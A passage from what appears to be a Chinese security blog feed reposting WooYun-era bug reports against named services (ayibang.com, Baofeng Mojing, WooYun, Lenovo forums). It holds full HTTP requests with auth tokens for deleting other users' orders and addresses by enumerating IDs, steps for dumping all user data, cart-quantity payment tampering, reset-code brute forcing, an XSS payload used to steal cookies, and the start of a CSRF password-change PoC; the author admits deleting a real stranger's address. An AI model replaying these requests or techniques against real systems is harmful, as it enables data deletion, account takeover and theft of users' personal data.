api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 42</span><br><span class="line">data=%7B%22orderID%22%3A%2211291191%22%7D&amp;</span><br></pre></td></tr></table></figure></p><blockquote><p>post处内容url解码后为：{“orderID”:”11291191”}</p></blockquote><ul><li>通过遍历orderID可删除所有订单</li><li>通过另一手机注册一个账号并下一个订单</li></ul><p><img src="http://static.zybuluo.com/1kbfree/mzp7hnp0e2a87hahk7jiq8ql/image_1cg3ur1ec14g027r19g41dkt1mcf34.png" alt="image_1cg3ur1ec14g027r19g41dkt1mcf34.png-40.7kB"></p><ul><li>抓包查得该订单ID为11292401</li></ul><p>提交以下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452846770206</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 42</span><br><span class="line">data=%7B%22orderID%22%3A%2211292401%22%7D&amp;</span><br></pre></td></tr></table></figure><p><em>成功取消订单</em></p><p><img src="http://static.zybuluo.com/1kbfree/8zylu68skeytdn4sc58pfbfd/image_1cg3ut157c3iebiblu6bi9uo3h.png" alt="image_1cg3ut157c3iebiblu6bi9uo3h.png-203.1kB"></p><p><strong>再查看该用户订单列表，已经成为空：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/22w1a0rxqcjyi8hjuq8ytgjq/image_1cg3utb0fmnlhhrq2vb4ibrj3u.png" alt="image_1cg3utb0fmnlhhrq2vb4ibrj3u.png-26.9kB"></p><h4 id="任意用户服务地址删除"><a href="#任意用户服务地址删除" class="headerlink" title="任意用户服务地址删除"></a>任意用户服务地址删除</h4><h5 id="1-点击app里面服务地址"><a href="#1-点击app里面服务地址" class="headerlink" title="1. 点击app里面服务地址"></a>1. 点击app里面服务地址</h5><p><img src="http://static.zybuluo.com/1kbfree/ppen0j15r6x111062t026kzr/image_1cg3uu7cn1ogc1ii614lh1r111qnm4b.png" alt="image_1cg3uu7cn1ogc1ii614lh1r111qnm4b.png-46.6kB"></p><h5 id="2-添加两个地址"><a href="#2-添加两个地址" class="headerlink" title="2. 添加两个地址"></a>2. 添加两个地址</h5><p><img src="http://static.zybuluo.com/1kbfree/cms8wr2368k53n9yeri8dsw0/image_1cg3uurka153p7s6m3c1lc1ohf4o.png" alt="image_1cg3uurka153p7s6m3c1lc1ohf4o.png-28.1kB"></p><p><strong>然后删除上面的两个地址，并抓包</strong></p><h6 id="1-删除第一个地址请求数据包如下："><a href="#1-删除第一个地址请求数据包如下：" class="headerlink" title="1. 删除第一个地址请求数据包如下："></a>1. 删除第一个地址请求数据包如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17334752 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br><span class="line">Network: WiFi</span><br><span class="line">City: nanjing</span><br><span class="line">Timestamp: 1452841496773</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure><p>返回数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 15 Jan 2016 07:04:57 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.11</span><br><span class="line">Content-Length: 628</span><br><span class="line">&#123;&quot;house&quot;:&#123;&quot;id&quot;:&quot;17334752&quot;,&quot;custID&quot;:&quot;16989352&quot;,&quot;city&quot;:&quot;nanjing&quot;,&quot;cityName&quot;:&quot;\u5357\u4eac&quot;,&quot;zone&quot;:&quot;null&quot;,&quot;nameAddr&quot;:&quot;\u5b9e\u9a8c\</span><br></pre></td></tr></table></figure></p><p>上面内容解码后如下：<br><img src="http://static.zybuluo.com/1kbfree/hw8ryqt15emqjebjk8f8awp7/image_1cg3v42g41m3b18ku15es1ea418n055.png" alt="image_1cg3v42g41m3b18ku15es1ea418n055.png-104.9kB"></p><blockquote><p>可以看到statusName处标记为已删除，并且数据包返回的ID与删除的ID为同一ID：17334752</p></blockquote><p><strong>再删除另外一个地址：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br><span class="line">Network: WiFi</span><br><span class="line">City: nanjing</span><br><span class="line">Timestamp: 1452841783577</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure></p><blockquote><p>由此可看到系统删除服务地址是根据不同的ID来实现的，虽然数字不是连续的，但是经过几次尝试发现都是以17开头的8位数字，如此遍可以通过遍历id删除其它用户的服务地址</p></blockquote><p><strong>只需提交以下数据包：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br></pre></td></tr></table></figure></p><p>通过burpsuite 遍历houseID处，即可删除所有用户收获地址</p><p><strong>以下为我随便找的一个用户地址（抱歉给这位用户带来困扰）：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17330512 HTTP/1.1</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47</span><br><span class="line">DNT: 1</span><br><span class="line">Accept-Encoding: gzip, deflate, lzma, sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br></pre></td></tr></table></figure></p><p><strong>返回：</strong><br><img src="http://static.zybuluo.com/1kbfree/o4qwyxhj25dogg6q0mc245ma/image_1cg3v85b91grlggsheep5k144b5i.png" alt="image_1cg3v85b91grlggsheep5k144b5i.png-104.3kB"></p><h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><p>如果需要通过浏览器复现上面问题，需要注意数据请求处有一个请求头：<br><code>Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</code><br>此处的authorization是用户在登录APP的时候服务器返回的认证key<br><img src="http://static.zybuluo.com/1kbfree/1esugc3rjsugawvsoapq73j0/image_1cg3vad5f5mr1rjf6j9k5m1fv55v.png" alt="image_1cg3vad5f5mr1rjf6j9k5m1fv55v.png-279.8kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;危害：看文章自己脑补&lt;br&gt;漏洞等级：高&lt;br&gt;提交时间：   2016-02-02 12:45&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="乌云历史文章" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="支付漏洞" scheme="127.0.0.1/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="越权漏洞" scheme="127.0.0.1/tags/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Xss漏洞" scheme="127.0.0.1/tags/Xss%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="密码逻辑漏洞" scheme="127.0.0.1/tags/%E5%AF%86%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>暴风魔镜某处设计缺陷可获取整站用户信息(xss/越权/密码逻辑/支付漏洞等)</title>
    <link href="127.0.0.1/2018/06/16/%E6%9A%B4%E9%A3%8E%E9%AD%94%E9%95%9C%E6%9F%90%E5%A4%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%8F%AF%E8%8E%B7%E5%8F%96%E6%95%B4%E7%AB%99%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/"/>
    <id>127.0.0.1/2018/06/16/暴风魔镜某处设计缺陷可获取整站用户信息/</id>
    <published>2018-06-16T07:47:31.000Z</published>
    <updated>2018-06-16T09:20:00.877Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>危害：看文章自己脑补<br>漏洞等级：高<br>提交时间：   2016-04-20 18:15</p></blockquote><a id="more"></a><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>a、首先来到用户信息地址管理这边</p><p><img src="http://static.zybuluo.com/1kbfree/by1eecokc7syxsb2b4he3dal/image_1cg3o6vu41qvff0jgoj55hn429.png" alt="image_1cg3o6vu41qvff0jgoj55hn429.png-18.3kB"></p><p>b、编辑保存抓包 当前用户地址是<code>48783</code> 改了下<code>48782</code>就直接遍历出来了</p><p><img src="http://static.zybuluo.com/1kbfree/b1nvfq2np6deai3hapi0alxd/image_1cg3o8is916j81koa1mpj18j7bkfm.png" alt="image_1cg3o8is916j81koa1mpj18j7bkfm.png-99.5kB"></p><p>c、下面直接遍历addressid</p><p><img src="http://static.zybuluo.com/1kbfree/c2uy1ihh6oi9uvv88cah7aaj/image_1cg3o968q13s2oqi11p5ipp3dc13.png" alt="image_1cg3o968q13s2oqi11p5ipp3dc13.png-46.5kB"></p><p>d、burp里显示乱码</p><p><img src="http://static.zybuluo.com/1kbfree/fqlpxgwom2s69n20ku78r9j4/image_1cg3o9re5buo1o9k2c116b21v9620.png" alt="image_1cg3o9re5buo1o9k2c116b21v9620.png-93.3kB"></p><p>e、然后导出到本地就变成中文啦 证明危害即可遍历几条</p><p><img src="http://static.zybuluo.com/1kbfree/rz0qcmgw0ndbt6aq135awfel/image_1cg3oaevv1q934pa1u1g1if418lc2d.png" alt="image_1cg3oaevv1q934pa1u1g1if418lc2d.png-84.8kB"></p><p>f、地址管理处可以xss</p><p><img src="http://static.zybuluo.com/1kbfree/ya2bf6ypnf6exd6l2bo3qk87/image_1cg3occi7lrp1ccvamgthu1jja2q.png" alt="image_1cg3occi7lrp1ccvamgthu1jja2q.png-18.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/4gv88bkmzsrl8daq2dqs6q0p/image_1cg3ocmmb1ci61glk4j3bgrdl937.png" alt="image_1cg3ocmmb1ci61glk4j3bgrdl937.png-62.7kB"></p><blockquote><p>可是只能x本地(self-xss)不太甘心 这个之前测试都是后台查看订单后才可以触发但是魔镜又贵 看了官网又挖不到支付漏洞宝宝不开心<br>然后下载app测试了一下 哈哈 来着购物车抓包</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/llyi39xq2fdiec3ds7maid34/image_1cg3oepri1oodro9qik38i19ns3k.png" alt="image_1cg3oepri1oodro9qik38i19ns3k.png-152.9kB"></p><p>g、修改num数量 1,-1</p><p><img src="http://static.zybuluo.com/1kbfree/2oyr7jbtm4mm7s113o2gijju/image_1cg3ojg8s1r2412ts1cu75j1l944h.png" alt="image_1cg3ojg8s1r2412ts1cu75j1l944h.png-34.7kB"></p><p><em>果然可以</em></p><p><img src="http://static.zybuluo.com/1kbfree/8zx2nrq78tdztyblltgccvl1/image_1cg3olo38nu41tcb1p3vskc1bj5b.png" alt="image_1cg3olo38nu41tcb1p3vskc1bj5b.png-158.9kB"></p><p>h、随后就到了支付宝付款界面ok 这里要是提交订单后台查看xss应该可以触发 但是莫有钱</p><p><img src="http://static.zybuluo.com/1kbfree/lt5h3qshb72za5e0kxbxf96s/image_1cg3omtmar5i1hv3meu1jmf1lgo5o.png" alt="image_1cg3omtmar5i1hv3meu1jmf1lgo5o.png-30.9kB"></p><p><em>这边密码爆破任意用户密码重置，因为之前我遍历了所有用户的信息包括手机号，这个可以配合一下直接重置任意用户咯，这里不做破坏就拿自己的来</em></p><p><img src="http://static.zybuluo.com/1kbfree/pze70o5bwsyjed2igr68on9a/image_1cg3oqb6i7nr6131ucf18k21qnh65.png" alt="image_1cg3oqb6i7nr6131ucf18k21qnh65.png-578.3kB"></p><p><em>虽然验证码是6位数的，但是60分钟应该够了</em></p><p><img src="http://static.zybuluo.com/1kbfree/26jig70v1s3sxp1bmksur1e4/image_1cg3or0iosjspdm1nh1151875q6i.png" alt="image_1cg3or0iosjspdm1nh1151875q6i.png-79kB"></p><h3 id="转载者想说的话"><a href="#转载者想说的话" class="headerlink" title="转载者想说的话"></a>转载者想说的话</h3><p>mmp，这个文章是我转载最难转载的一篇，没有之一，其中原因不多说，原文地址:<code>http://wy.daochuan.net/bug_detail.php?wybug_id=wooyun-2016-0198593</code></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;危害：看文章自己脑补&lt;br&gt;漏洞等级：高&lt;br&gt;提交时间：   2016-04-20 18:15&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="乌云历史文章" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="支付漏洞" scheme="127.0.0.1/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="越权漏洞" scheme="127.0.0.1/tags/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Xss漏洞" scheme="127.0.0.1/tags/Xss%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="密码逻辑漏洞" scheme="127.0.0.1/tags/%E5%AF%86%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>乌云某处逻辑错误导致越权</title>
    <link href="127.0.0.1/2018/06/15/%E4%B9%8C%E4%BA%91%E6%9F%90%E5%A4%84%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E8%B6%8A%E6%9D%83/"/>
    <id>127.0.0.1/2018/06/15/乌云某处逻辑错误导致越权/</id>
    <published>2018-06-15T15:08:04.000Z</published>
    <updated>2018-06-15T16:12:52.214Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>危害：厂商可查看所有自家漏洞提交者的乌云ID（包括路人甲）<br>漏洞等级：低危<br>提交时间：   2016-06-23 12:05</p></blockquote><a id="more"></a><ul><li>打开漏洞后，点击“给漏洞作者发送礼物”，通过抓包即可得到含有该漏洞提交者的whitehatid，相应链接为：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/actdo.php?action=sms&amp;do=giftremind&amp;corpid=1&amp;whitehatid=11111</span><br></pre></td></tr></table></figure><ul><li><p>id为1的厂商向whitehatid为11111的白帽子发送礼物接收提醒，因此提交此漏洞的白帽子whitehatid为11111.</p></li><li><p>在获取到白帽子的whitehatid后，只需找到一个地方能够对应到白帽子的乌云id即可；</p></li><li><p>可能获知whitehatid<->白帽子id的对应方法还有其他的，这里我仅用了下面这个来实现。</-></p></li><li><p>访问以下链接，向该白帽子索取联系方式（但无需白帽子确认）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/actdo.php?action=sms&amp;do=contactwhitehat&amp;whitehatid=11111</span><br></pre></td></tr></table></figure></li><li><p>接着继续访问以下链接提醒白帽子接收礼物</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/actdo.php?action=sms&amp;do=giftremind&amp;corpid=1&amp;whitehatid=11111</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>经测试发现，只要厂商曾经尝试索取白帽子联系方式后（不管是否成功获取），再提醒白帽子接收礼物，即可在厂商信息主页处看到给<em>**</em>发送礼物，此时白帽子的乌云ID就出来了。</p></blockquote><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;危害：厂商可查看所有自家漏洞提交者的乌云ID（包括路人甲）&lt;br&gt;漏洞等级：低危&lt;br&gt;提交时间：   2016-06-23 12:05&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="乌云历史文章" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="权限失控" scheme="127.0.0.1/tags/%E6%9D%83%E9%99%90%E5%A4%B1%E6%8E%A7/"/>
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘经验之联想游戏论坛存在&quot;奇异&quot;反射Xss</title>
    <link href="127.0.0.1/2018/06/15/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%81%94%E6%83%B3%E6%B8%B8%E6%88%8F%E8%AE%BA%E5%9D%9B%E5%AD%98%E5%9C%A8%E5%A5%87%E5%BC%82%E5%8F%8D%E5%B0%84Xss/"/>
    <id>127.0.0.1/2018/06/15/漏洞挖掘经验之联想游戏论坛存在奇异反射Xss/</id>
    <published>2018-06-15T08:51:53.000Z</published>
    <updated>2018-07-10T08:28:42.139Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部文章，禁止外泄!</p></blockquote><a id="more"></a><p>漏洞URL : <a href="http://bbs.lenovogame.com/bbs/common/topic/index.do?id=69153" target="_blank" rel="noopener">http://bbs.lenovogame.com/bbs/common/topic/index.do?id=69153</a></p><h5 id="0-我们开始打开漏洞的地址"><a href="#0-我们开始打开漏洞的地址" class="headerlink" title="0. 我们开始打开漏洞的地址"></a>0. 我们开始打开漏洞的地址</h5><p>这里是需要登录或者注册，到时候自己注册登录一下就可以看到如下这个界面了。  </p><p><img src="http://static.zybuluo.com/1kbfree/5q1rnqzod7l0u5w880tr4138/image_1cg1akgfq3mgi991adhp1e1jji2h.png" alt="image_1cg1akgfq3mgi991adhp1e1jji2h.png-80kB"></p><h5 id="1-插入Xss代码"><a href="#1-插入Xss代码" class="headerlink" title="1. 插入Xss代码"></a>1. 插入Xss代码</h5><p>在帖子的评论区域插入代码<code>&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;</code>,如图</p><p><img src="http://static.zybuluo.com/1kbfree/kiux3cmbuucemw9bgh5d8s9v/xss1.png" alt="xss1.png-56.2kB"></p><blockquote><p>说实话也是运气好，我这段代码很早以前就插进去了，在电脑版的网页中，没有弹窗，但换到手机版本却有奇效（大家一定要多多测试，不要漏掉每一个细节）  </p></blockquote><h5 id="2-打开帖子查看"><a href="#2-打开帖子查看" class="headerlink" title="2. 打开帖子查看"></a>2. 打开帖子查看</h5><p><img src="http://static.zybuluo.com/1kbfree/qdc1a2tlhck7lwmbxosmlvyo/xss2.png" alt="xss2.png"></p><p><em>点击帖子处后可以看到下图的效果</em></p><p><img src="http://static.zybuluo.com/1kbfree/h2enlt4rez4ndtcmbxm1i43u/xss3.png" alt="xss3.png"></p><p><em>可以看到这里已经弹窗了，那么我们再深入利用一下</em></p><p><img src="http://static.zybuluo.com/1kbfree/2gw9k41an74d6tca2j09mmkl/xss4.png" alt="xss4.png-48.2kB"></p><h5 id="3-接着查看下是否有接受到Cookie"><a href="#3-接着查看下是否有接受到Cookie" class="headerlink" title="3. 接着查看下是否有接受到Cookie"></a>3. 接着查看下是否有接受到<code>Cookie</code></h5><p><img src="http://static.zybuluo.com/1kbfree/vhuxoy6or7ts6uzyva6wgo5x/xss5.png" alt="xss5.png-221.7kB"></p><p><em>成功获取到<code>Cookie</code>，说明是存在<code>Xss</code>的</em></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部文章，禁止外泄!&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内部资料" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/"/>
    
      <category term="实战渗透" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="作者(一条快乐的咸鱼)" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/Web%E6%94%BB%E9%98%B2/%E4%BD%9C%E8%80%85-%E4%B8%80%E6%9D%A1%E5%BF%AB%E4%B9%90%E7%9A%84%E5%92%B8%E9%B1%BC/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="Xss漏洞" scheme="127.0.0.1/tags/Xss%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘经验之联想E采存在Csrf漏洞</title>
    <link href="127.0.0.1/2018/06/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E8%81%94%E6%83%B3E%E9%87%87%E5%AD%98%E5%9C%A8Csrf%E6%BC%8F%E6%B4%9E/"/>
    <id>127.0.0.1/2018/06/14/漏洞挖掘之联想E采存在Csrf漏洞/</id>
    <published>2018-06-14T15:27:24.000Z</published>
    <updated>2018-07-10T08:28:15.226Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部资料，禁止外泄!</p></blockquote><div class="note info"><p>危害：当用户点击我( 攻击者 )构造好的Csrf Poc后，他们的密码就会修改成我( 攻击者 )设置好的密码~</p></div><a id="more"></a><h5 id="先注册两个账号，邮箱分别为-clickjacking-126-com-和-623425849-qq-com-其中-623425849-qq-com-的密码为-12345678aa"><a href="#先注册两个账号，邮箱分别为-clickjacking-126-com-和-623425849-qq-com-其中-623425849-qq-com-的密码为-12345678aa" class="headerlink" title="先注册两个账号，邮箱分别为 clickjacking@126.com 和 623425849@qq.com,其中 623425849@qq.com 的密码为 12345678aa"></a>先注册两个账号，邮箱分别为 <code>clickjacking@126.com</code> 和 <code>623425849@qq.com</code>,其中 <code>623425849@qq.com</code> 的密码为 <code>12345678aa</code></h5><h5 id="这里都按照正常流程操作-在忘记密码处输入用户名clickjacking-126-com"><a href="#这里都按照正常流程操作-在忘记密码处输入用户名clickjacking-126-com" class="headerlink" title="这里都按照正常流程操作,在忘记密码处输入用户名clickjacking@126.com"></a>这里都按照正常流程操作,在忘记密码处输入用户名<code>clickjacking@126.com</code></h5><p><img src="http://static.zybuluo.com/1kbfree/976m79f968l4kpmyxo0ddkil/csrf1.png" alt="csrf1.png-150.5kB"></p><h5 id="点下一步，输入邮箱发送过来的验证码"><a href="#点下一步，输入邮箱发送过来的验证码" class="headerlink" title="点下一步，输入邮箱发送过来的验证码."></a>点下一步，输入邮箱发送过来的验证码.</h5><p><img src="http://static.zybuluo.com/1kbfree/3dz32xyw0zcjrjwh6knhly5c/csrf2.png" alt="csrf2.png">  </p><h5 id="点下一步，输入新密码，抓包"><a href="#点下一步，输入新密码，抓包" class="headerlink" title="点下一步，输入新密码，抓包."></a>点下一步，输入新密码，抓包.</h5><p><img src="http://static.zybuluo.com/1kbfree/wuzoww8knv8h3te4v9om6dxl/csrf3.png" alt="csrf3.png-62kB"> </p><h5 id="将数据包制作成Csrf-Poc，如下"><a href="#将数据包制作成Csrf-Poc，如下" class="headerlink" title="将数据包制作成Csrf Poc，如下"></a>将数据包制作成Csrf Poc，如下</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 